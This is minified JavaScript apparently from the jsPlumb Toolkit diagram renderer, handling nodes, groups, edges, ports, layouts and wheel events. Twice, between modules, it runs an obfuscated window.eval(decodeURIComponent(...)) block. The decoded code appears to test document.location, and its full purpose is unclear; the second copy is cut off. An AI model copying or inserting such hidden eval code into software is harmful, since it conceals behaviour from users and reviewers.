e};P.bind(l.nodeAdded,function(n){var t,e=n.node,o=ln(e,n.eventInfo);if(null!=o){var i=G.getSelector(o,"[data-port-id]");for(t=0;t<i.length;t++){var r=i[t].getAttribute("data-port-id");$[e.id+"."+r]=i[t],i[t].jtk=i[t].jtk||{node:e,port:e.getPort(r)}}D.refresh(!0)}}),P.bind(l.nodeRemoved,function(n){D.getLayout().nodeRemoved(n.nodeId);var t=Z[n.nodeId];D.fire(l.nodeRemoved,{node:n.nodeId,el:t});var e=G.getId(t);y.remove(t),G.remove(t),delete Z[n.nodeId],delete Dn[n.nodeId],delete Pn[n.nodeId],delete q[e],function(n){var t=nn.indexOf(n);-1!==t&&nn.splice(t,1)}(n.node),delete t.jtk,D.refresh(!0)});var un=function(){n.relayoutOnGroupUpdate&&D.relayout()};P.bind("group:addMember",un),P.bind("group:removeMember",un);var cn=function(t,e){var o=J[t.id];if(null==o){var d=dn.getGroupDefinition(P.getNodeType(t.data));if(!0===d.ignore)return!1;if(!(o=Cn(t,t.data,t)))throw new Error("Cannot render Group");var _=G.getId(o);J[t.id]=o,K.push(t),Q[_]=t,o.jtk={group:t},D.append(o,_,e?e.position:null),_n(o,t),Sn(o,t);var s={node:t,el:o},a={el:o,id:t.id};r.extend(a,{dragOptions:n.dragOptions||{}}),a.dragOptions[r.dragEvents[w.stop]]=i.wrap(a.dragOptions[r.dragEvents[w.stop]],function(n){n.el.jtk&&n.el.jtk.group&&(a.dragOptions.magnetize?n.pos=D.getLayout().setMagnetizedPosition(n.el.jtk.group.id,n.pos[0],n.pos[1],!0):D.getLayout().setPosition(n.el.jtk.group.id,n.pos[0],n.pos[1],!0),!1!==L&&(D.storePositionInModel({id:n.el.jtk.group.id,group:!0,leftAttribute:O,topAttribute:F}),P.fire(l.groupUpdated,{group:n.el.jtk.group},null)),D.fire(l.groupMoveEnd,{el:n.el,group:n.el.jtk.group,pos:n.pos,e:n.e,eventPosition:n.pos}))}),G.addGroup(r.extend(a,d)),D.getLayout().groupAdded({group:t,el:o,id:t.id},e),D.fire(l.groupAdded,s)}return o};P.bind(l.groupAdded,function(n){var t=n.group;null!=cn(t,n.eventInfo)&&D.refresh(!0)}),P.bind(l.groupRemoved,function(n){var t=n.group;D.getLayout().groupRemoved(t.id);var e=J[t.id],o=G.getId(e);G.removeGroup(t.id,n.removeChildNodes,!0,!1),delete J[t.id],delete Q[o],delete e.jtk,D.refresh(!0)}),this.expandGroup=function(n){G.expandGroup("string"==typeof n?n:n.id)},this.collapseGroup=function(n){G.collapseGroup("string"==typeof n?n:n.id)},this.toggleGroup=function(n){G.toggleGroup("string"==typeof n?n:n.id)};var Bn=function(n,t){for(var e,o,i=n.getNodes(),r=0,d=0,_=D.getLayout(),s=G.getGroup(n.id).getDragArea(),a=t.autoSizePadding||[10,10],w=0;w<i.length;w++)e=_.getPosition(i[w].id),isNaN(e[0])||isNaN(e[1])||(o=_.getSize(i[w].id),r=Math.max(r,e[0]+o[0]+a[0]),d=Math.max(d,e[1]+o[1]+a[1]));r=t.maxSize?Math.min(t.maxSize[0],r):r,d=t.maxSize?Math.min(t.maxSize[1],d):d,s.style.width=r+"px",s.style.height=d+"px",_.setSize(n.id,[r,d])},hn=function(){for(var n in J){var t=P.getGroup(n);if(t){var e=dn.getGroupDefinition(P.getNodeType(t.data));e.autoSize&&Bn(t,e)}}};D.autoSizeGroups=hn;P.bind(l.edgeAdded,function(t){if(!Y&&t.source!==D){var e=t.edge,o=dn.getEdgeDefinition(P.getEdgeType(e.data||{}));if(o&&!0===o.ignore)return;var i=function(t,e){return function(){var o=fn(t);o.doNotFireConnectionEvent=!0,e&&(o.geometry=e),P.isDebugEnabled()&&console.log("Renderer","adding edge with params",o);var i=G.connect(o);i.edge=t,tn[t.getId()]=i,rn(o.type,t,i),D.fire(l.edgeAdded,{source:t.source,target:t.target,connection:i,edge:t,geometry:e}),n.refreshLayoutOnEdgeConnect&&D.refresh(!0);var r=t.source.getNode?t.source.getNode():t.source,d=Z[r.id],_=t.target.getNode?t.target.getNode():t.target;!1!==Z[_.id]._jtkVisible&&!1!==d._jtkVisible||p(t,!1)}}(e,t.geometry);n.connectionHandler?n.connectionHandler(e,i):i()}}),P.bind(l.edgeRemoved,function(n){if(!Y&&n.source!==D){var t=n.edge,e=tn[t.getId()];e&&(P.isDebugEnabled()&&console.log("Renderer","removing edge",t),function(n){D.fire(l.edgeRemoved,{sourceNodeId:n.source.getNode?n.source.getNode().getId:n.source.getFullId(),targetNodeId:n.target.getNode?n.target.getNode().getId:n.target.getFullId(),sourcePortId:"Port"===n.source.objectType?n.source.id:null,targetPortId:"Port"===n.target.objectType?n.target.id:null,sourceId:n.source.getFullId(),targetId:n.target.getFullId(),source:n.source,target:n.target,edge:n})}(t),delete tn[t.getId()],null!=e._jsPlumb&&G.deleteConnection(e,{fireEvent:!1}))}}),P.bind(l.edgeTypeChanged,function(n){if(!Y&&n.source!==D){var t=n.obj,e=tn[t.getId()];if(e){var o=dn.getEdgeDefinition(n.newType);if(o&&!0===o.ignore)return;o.connector&&e.setConnector(o.connector),e.setType(n.newType,t.data)}}}),P.bind(l.edgeTarget,function(n){if(!Y){var t=n.edge,e=tn[t.getId()],o=Z[t.target.getFullId()];e?G.silently(function(){null!=o?(P.isDebugEnabled()&&console.log("target change",e),G.setTarget(e,o)):(delete tn[t.getId()],G.detach({connection:e,forceDetach:!0,fireEvent:!1}))}):null!=o&&P.isDebugEnabled()&&i.log("Target for Edge "+t.getId()+" changed to Node "+o.id+"; we have no valid connection.")}}),P.bind(l.edgeSource,function(n){if(!Y){var t=n.edge,e=tn[t.getId()],o=Z[t.source.getFullId()];e?G.silently(function(){null!=o?G.setSource(e,o):(delete tn[t.getId()],G.detach({connection:e,forceDetach:!0,fireEvent:!1}))}):null!=o&&P.isDebugEnabled()&&i.log("Source for Edge "+t.getId()+" changed to Node "+o.id+"; we have no valid connection.")}}),P.bind("graphClearStart",function(){for(var n in G.reset(!0),J)void 0!==J[n]._rotors&&y.remove(J[n]),J[n].parentNode&&J[n].parentNode.removeChild(J[n]);for(var t in Z)void 0!==Z[t]._rotors&&y.remove(Z[t]),Z[t].parentNode&&Z[t].parentNode.removeChild(Z[t]);E&&E.clear(),nn.length=0,K.length=0,tn={},Z={},J={},q={},Q={},$={},yn={},D.getZoom&&G.setZoom(D.getZoom())}),P.bind(l.portAdded,function(n){var t=Z[n.node.id]||J[n.node.id];if(dn.getPortDefinition(P.getPortType(n.data)).isEndpoint)u(new An(n.data,t,n.port),n.node);else{var e=vn(n.port,n.data,n.node);$[n.node.id+P.getGraph().getPortSeparator()+n.port.id]=e,Sn(G.getElement(e),n.node),D.fire(l.portAdded,{node:n.node,nodeEl:t,port:n.port,portEl:e})}G.recalculateOffsets(t),D.refresh(!0)}),P.bind(l.portRemoved,function(n){var t=Z[n.node.id]||J[n.node.id],e=n.node.id+"."+n.port.id,o=$[e];G.setSuspendEvents(!0),G.remove(o),G.setSuspendEvents(!1),delete $[e],D.fire(l.portRemoved,{node:n.node,port:n.port,portEl:o,nodeEl:t}),G.recalculateOffsets(t),D.refresh(!0)}),P.bind(l.edgeUpdated,function(n){var t=tn[n.edge.getId()];if(t){var e=fn(n.edge);t.setType(e.type,e.data)}}),P.bind(l.portUpdated,function(n){var t=$[n.port.getFullId()];t&&(y.update(t,n.port.data),D.repaint(Z[n.node.id]))}),P.bind(l.nodeUpdated,function(n){var t=Z[n.node.getFullId()];if(t){y.update(t,n.node.data),Sn(t,n.node);var e=N(n.node);if(null!=e){var o=i.isArray(e)?e:[e];o.unshift(t),G.setPosse.apply(G,o)}else G.removeFromAllPosses(t);D.repaint(t)}})}this.setView=function(n){var t=i.merge(P.getModel(),n||{});dn=new e.Model(t,G)},this.setView(n.view),this.getView=function(){return dn};var jn=[],pn=function(n){return null==n?P:"string"==typeof n?P.select(n,!0):n.jtk?P.select(n.jtk.port||n.jtk.node,!0):n};this.activateState=function(n,t){var e=dn.getState(n);e&&(t=pn(t),e.activate(t,D,P),jn.push(e))},this.deactivateState=function(n,t){var e=dn.getState(n);e&&(t=pn(t),e.deactivate(t,D,P),i.removeWithFunction(jn,function(n){return n==e}))},this.resetState=function(){for(var n=0;n<jn.length;n++)jn[n].deactivate(P,D,P);jn.length=0};var fn=function(n){var t=P.getEdgeType(n.data),e={type:t,connectionType:t,data:n.data,cost:n.getCost(),directed:n.isDirected()},o=dn.getEdgeDefinition(t);!function(n){if(o)for(var t=0;t<n.length;t++)o[n[t]]&&(e[n[t]]=o[n[t]])}(["connector","endpoints","endpoint","endpointStyles","endpointStyle"]),e.anchor&&!e.anchors&&(e.anchors=[e.anchor,e.anchor],delete e.anchor),e.endpoint&&!e.endpoints&&(e.endpoints=[e.endpoint,e.endpoint],delete e.endpoint);var i=function(n,t,e,o,i){if(o&&o[e]){var r=n[t]||[o[e],o[e]];r[i]=o[e],n[t]=r}},r=function(t,o){if(n[t].getNode){var r=n[t].getNode(),d=n[t].getFullId(),_=yn[d]||$[d];e[t]=null!=_?_:$[d],null==e[t]&&(e[t]=Z[P.getNodeId(r.data)]);var s=dn.getPortDefinition(n[t].getType());i(e,"anchors","anchor",s,o),i(e,"endpoints","endpoint",s,o)}else{var a=P.getNodeId(n[t].data);_=0===o?Dn[a]:Pn[a];e[t]=null==_?Z[a]||J[a]:_}};return r("source",0),r("target",1),e},gn=function(n,t,e,o,i,d,_,s){return function(a,w,l){var u,c=t(w),B=null,h=e(w),j=dn[o](h),p=w;if(M){p=r.extend({},j&&j.parameters||{}),r.extend(p,w);var f={};for(u in p)p.hasOwnProperty(u)&&null!=p[u]&&(p[u].constructor==Function?f[u]=p[u](w):f[u]=p[u]);p=f}if(j){var g=j.template||"jtk-template-"+h;B=j.templateRenderer?j.templateRenderer(g,p,P,n):T.render(g,p,P,n)}else B=i(p,c);(B=G.getElement(B)).setAttribute(s,c),r.addClass(B,_),B.jtk=B.jtk||{},B.jtk[n]=a,B.jtk.node=l,d&&A&&kn.makeDraggable&&kn.makeDraggable(B,j.dragOptions),S&&kn.makeDroppable&&kn.makeDroppable(B,j.dropOptions);var m=function(n){G.on(B,n,function(t){j.events[n]({node:l,el:B,e:t,toolkit:P,renderer:D})})};if(j&&j.events)for(u in j.events)m(u);return B}},mn=gn("node",P.getNodeId,P.getNodeType,"getNodeDefinition",m,!0,a.NODE,_.NODE),vn=gn("port",P.getPortId,P.getPortType,"getPortDefinition",m,!1,a.PORT,_.PORT),Cn=gn("group",P.getNodeId,P.getNodeType,"getGroupDefinition",m,!1,a.GROUP,_.GROUP);this.initialize=function(){var t,e,o,i,r;if(P.setSuspendGraph(!0),G.setSuspendDrawing(!0),n.jsPlumbInstance){for(var d in n.jsPlumbInstance.select().each(function(n){tn[n.edge.getId()]=n}),e=n.jsPlumbInstance.getManagedElements()){var _=e[d].el;Z[_.jtk.node.id]=_,q[n.jsPlumbInstance.getId(_)]=_.jtk.node}kn.doImport&&kn.doImport(Z,tn)}else{for(t=0,o=P.getGroupCount();t<o;t++)i=P.getGroupAt(t),cn(i);for(t=0,o=P.getNodeCount();t<o;t++)e=P.getNodeAt(t),ln(e);for(t=0,o=P.getNodeCount();t<o;t++)if(e=P.getNodeAt(t),Z[e.id]){var s=P.getAllEdgesFor(e);for(r=0;r<s.length;r++)if(s[r].source==e||s[r].source.getNode&&s[r].source.getNode()==e){var a=dn.getEdgeDefinition(P.getNodeType(s[r].data));if(a&&!0===a.ignore)continue;var w=fn(s[r]);w.doNotFireConnectionEvent=!0;var l=G.connect(w);null!=l&&(l.edge=s[r],tn[s[r].getId()]=l,rn(w.type,s[r],l))}}}hn(),this.relayout(),G.setSuspendDrawing(!1,!0),P.setSuspendGraph(!1)},this.getContainer=function(){return x},this.getContainerId=function(){return U},this.getRenderedElement=function(n){if(null==n)return null;var t=n.getFullId();return"Port"===n.objectType?$[t]:"Group"===n.objectType?J[t]:Z[t]},this.getRenderedNode=function(n){return Z[n]},this.getRenderedGroup=function(n){return J[n]},this.getRenderedPort=function(n){return $[n]},this.getRenderedConnection=function(n){return tn[n]},this.getRenderedEndpoint=function(n){var t=g(n),e=null;return t&&t.obj&&"Port"===t.obj.objectType&&G.selectEndpoints({element:t.el}).each(function(n){n.graph&&n.graph.port&&n.graph.port===t.obj&&(e=n)}),e};var bn=function(n){var t=G.extend({container:x,getElementForNode:function(n){return Z[n]||J[n]}},n);if(t.jsPlumbToolkit=P,t.adapter=D,!e.Layouts[t.type])throw"no such layout ["+t.type+"]";return t.locationFunction||(t.locationFunction=function(n){return[d.data(n.data,O),d.data(n.data,F)]}),new e.Layouts[t.type](t)};this.adHocLayout=function(n){if(n){var t=E;this.setLayout(n),E=t}},this.setLayout=function(n,t){if(n){var e=r.extend({jsPlumb:this.getJsPlumb()},n);E=bn(e),t||D.refresh()}},this.getLayout=function(){return E},this.getMagnetizedElements=function(){return null!=E?E.getMagnetizedElements():[]},this.magnetize=function(n){null!=E&&E.magnetize(n)},this.refresh=function(n){I||n&&!k||(E?E.layout(function(){"undefined"!=typeof window?window.setTimeout(G.repaintEverything,0):G.repaintEverything()}):G.repaintEverything())},this.setRefreshAutomatically=function(n){k=n},this.relayout=function(n){I||(E?E.relayout(n,function(){G.repaintEverything(),this.fire("relayout",this.getBoundsInfo())}.bind(this)):G.repaintEverything())},this.getPath=function(n){var t=P.getPath(n);return t&&(t.setVisible=function(n){D.setVisible(t,n)},t.addNodeClass=function(n){t.eachNode(function(t,e){G.addClass(Z[e.id],n)})},t.removeNodeClass=function(n){t.eachNode(function(t,e){G.removeClass(Z[e.id],n)})},t.addEdgeClass=function(n){t.eachEdge(function(t,e){tn[e.getId()].addClass(n)})},t.removeEdgeClass=function(n){t.eachEdge(function(t,e){tn[e.getId()].removeClass(n)})},t.addClass=function(n){this.addNodeClass(n),this.addEdgeClass(n)},t.removeClass=function(n){this.removeNodeClass(n),this.removeEdgeClass(n)}),t},this.getPosition=function(n){var t=this.getLayout();if(t){var e=g(n).id;return t.getPosition(e)}},this.getSize=function(n){return G.getSize(g(n).el)},this.getCoordinates=function(n){var t=this.getLayout();if(t){var e=g(n),o=t.getPosition(e.id),i=G.getSize(e.el);return{x:o[0],y:o[1],w:i[0],h:i[1]}}};var yn={},Dn={},Pn={},En=function(n,t,e){var d=n.value("port-id"),_=n.value("port-type")||"default",s=n.value("scope")||G.getDefaultScope(),a=P.getNodeType(t),w=dn.getNodeDefinition(a),l=dn.getPortDefinition(d,w),u=dn.getPortDefinition(_,w),c=i.merge(u,l),B=null==c?{}:o.populate(c,t.data),h=function(n){return function(e){var o=t.getPort(d),i=[{portId:d,nodeId:t.id,port:o,node:t,portType:_,endpoint:e.endpoint,anchor:e.anchor}];n.apply(n,i)}},j=function(n){return function(t){var e=[{connection:t.connection||t,source:g(t.source),target:g(t.target),scope:t.scope}];return n.apply(n,e)}},p=B.edgeType||n.value("edge-type")||"default",f={paintStyle:"connectorStyle",hoverPaintStyle:"connectorHoverStyle",overlays:"connectorOverlays",endpointStyle:"paintStyle"},m=dn.getEdgeDefinition(p);if(m)for(var v in m){var C=f[v]||v;null==B[C]&&(B[C]=m[v])}if(B.connectionType=p,B.portId=d,B.portType=_,B.scope=s,B.parameters=B.parameters||{},B.parameters.portId=d,B.parameters.portType=_,B.parameters.edgeType=p,B.parameters.scope=s,B.parameters.nodeId=t.id,B.events={},c.events)for(v in c.events)B.events[v]=h(c.events[v]);if(c.interceptors)for(v in c.interceptors)B[v]=j(c.interceptors[v]);var b=n.value("anchor-x"),y=n.value("anchor-y"),E=n.value("orientation-x"),x=n.value("orientation-y"),A=n.value("offset-x"),S=n.value("offset-y");return null!=b&&null!=y&&(B.anchor=[parseFloat(b),parseFloat(y),parseInt(E||"0",10),parseInt(x||"0",10),parseFloat(A||"0"),parseFloat(S||"0")]),r.extend(B,e||{}),B.events.anchorChanged=function(n){D.fire("anchorChanged",{portId:d,nodeId:t.id,portType:_,node:t,port:t.getPort(d),endpoint:n.endpoint,anchor:n.anchor})},B},xn=function(n){this.element=n.parentNode,this.value=function(t,e){var o=n.getAttribute(t);return null==o?e:o},this.setValue=function(t,e){n.setAttribute(t,e)},this.findDataValues=function(t){for(var e=0;e<n.attributes.length;e++){var o=n.attributes[e];0===o.name.indexOf("data-")&&(t[o.value]=o.name.split("-")[1])}}},An=function(n,t,e){this.element=t,this.port=e,this.value=function(t,e){var o=n[t.replace(/(\-\w)/g,function(n){return n[1].toUpperCase()})];return null==o?e:o},this.findDataValues=function(t){for(var e in n)0===e.indexOf("data-")&&(t[n[e]]=e.split("-")[1])},this.setValue=function(n,e){t.setAttribute(n,e)}},Sn=function(n,t){var e,o=r.getSelector(n,s.PORT),i=r.getSelector(n,s.SOURCE),d=r.getSelector(n,s.TARGET);for(e=0;e<i.length;e++)B(new xn(i[e]),t);for(e=0;e<d.length;e++)h(new xn(d[e]),t);for(e=0;e<o.length;e++)u(new xn(o[e]),t)};this.setLayout(n.layout,!0),this.storePositionsInModel=function(n){var t=(n=n||{}).leftAttribute||"left",e=n.topAttribute||"top",o=E.getPositions();for(var i in o){var r=P.getNode(i)||P.getGroup(i);r&&(d.data(r.data,t,o[i][0]),d.data(r.data,e,o[i][1]))}},this.storePositionInModel=function(n){var t="string"==typeof n?n:n.id,e="string"==typeof n?"left":n.leftAttribute||"left",o="string"==typeof n?"top":n.topAttribute||"top",i=E.getPosition(t),r=P[n.group?"getGroup":"getNode"](t);return r&&(d.data(r.data,e,i[0]),d.data(r.data,o,i[1])),i};var In=function(n,t,e,o,i,r,d){return(n=n||g(t))&&(E.setPosition(n.id,e,o),i||(G.setAbsolutePosition(n.el,[e,o],r,d),G.revalidate(n.el))),n};this.setPosition=function(n,t,e,o){return In(null,n,t,e,o)},this.animateToPosition=function(n,t,e,o){var i=g(n);if(i){var r=E.getPosition(i.id);In(i,n,t,e,!1,[r[0],r[1]],o)}},this.isVisible=function(n){return f(n,function(n){switch(n.type){case"Edge":var t=en(n.obj);return!!t&&t.isVisible();case"Node":return n.el._jtkVisible}})},this.setVisible=function(n,t,e){if(null!=n){f(n,function(n){switch(n.type){case"Edge":p(n.obj,t,e);break;case"Node":!function(n,o){if(o&&(o.style.display=t?"block":"none",o._jtkVisible=t,D.fire(l.nodeVisibility,{node:n,el:o,state:t}),!e))for(var i=P.getAllEdgesFor(n),r=0;r<i.length;r++)p(i[r],t,e)}(n.obj,n.el);break;case"Port":!function(n){var e=n.getFullId();yn[e].setVisible(t)}(n.obj)}})}},this.addToPosse=function(n,t,e){o.each(n,function(n){var o=g(n);o.el&&G.addToPosse(o.el,{id:t,active:!1!==e})})},this.setPosse=function(n,t){o.each(n,function(n){var e=g(n);e.el&&G.setPosse(e.el,t)})},this.removeFromPosse=function(n,t){o.each(n,function(n){var e=g(n);e.el&&G.removeFromPosse(e.el,t)})},this.removeFromAllPosses=function(n){o.each(n,function(n){var t=g(n);t.el&&G.removeFromAllPosses(t.el)})},this.setPosseState=function(n,t,e){o.each(n,function(n){var o=g(n);o.el&&G.setPosseState(o.el,t,e)})};var kn={jsPlumb:G,toolkit:P,container:x,containerId:U,getConnectionsForEdges:function(n){for(var t=[],e=0;e<n.length;e++)t.push(tn[n[e].getId()]);return t},getConnectionForEdge:en,getElement:function(n){return Z[n]||J[n]},getNodeForElementId:function(n){return q[n]},getGroupForElementId:function(n){return Q[n]},getObjectInfo:g,nodeMap:function(){return Z},portMap:function(){return $},groupMap:function(){return J},reverseGroupMap:function(){return Q},reverseNodeMap:function(){return q}};return kn};t.DOM=function(n){c.apply(this,arguments),u.apply(this,arguments)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){function n(n,t,e){return function(o){return o[n]/t*(e?-1:1)}}var t="deltaY",e="deltaX",o={webkit:{mac:n(t,120),win:n(t,100)},safari:function(t){return n("wheelDeltaY",120,!0)},firefox:{mac:function(n){return n.deltaY*(1===n.deltaMode?25:1)*-1/120},win:function(n){return-1*n.deltaY/3}},ie:function(n){return n.wheelDelta/120},default:function(n){return n.deltaY||n.wheelDelta}},i={webkit:{mac:n(e,120),win:n(e,100)},safari:function(t){return n("wheelDeltaX",120,!0)},firefox:{mac:function(n){return n.deltaX*(1===n.deltaMode?25:1)*-1/120},win:function(n){return-1*n.deltaX/3}},ie:function(n){return n.wheelDelta/120},default:function(n){return n.deltaX||n.wheelDelta}},r=/Mac/.test(navigator.userAgent)?"mac":"win",d=-1!==navigator.userAgent.indexOf("Firefox")?"firefox":/Chrome/.test(navigator.userAgent)?"webkit":/Safari/.test(navigator.userAgent)?"safari":/WebKit/.test(navigator.userAgent)?"webkit":/Trident/.test(navigator.userAgent)?"ie":"default",_="function"==typeof o[d]?o[d]:o[d][r],s="function"==typeof i[d]?i[d]:i[d][r],a=function(n,t,e){return function(o){if(!t||null==o.mozInputSource||1===o.mozInputSource){var i=function(n){return _(n||event)}(o),r=function(n){return s(n||event)}(o);o.normalizedWheelDelta=i,(!e||o.metaKey||o.ctrlKey)&&n(o,r,i,o.metaKey||o.ctrlKey)}}},w="onwheel"in document.createElement("div")?"wheel":void 0!==document.onmousewheel?"mousewheel":"DOMMouseScroll";this.addWheelListener=function(n,t,e,o){var i=a(t,e,o);n.addEventListener?n.addEventListener(w,i,!1):n.attachEvent&&n.attachEvent("onmousewheel",i)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindo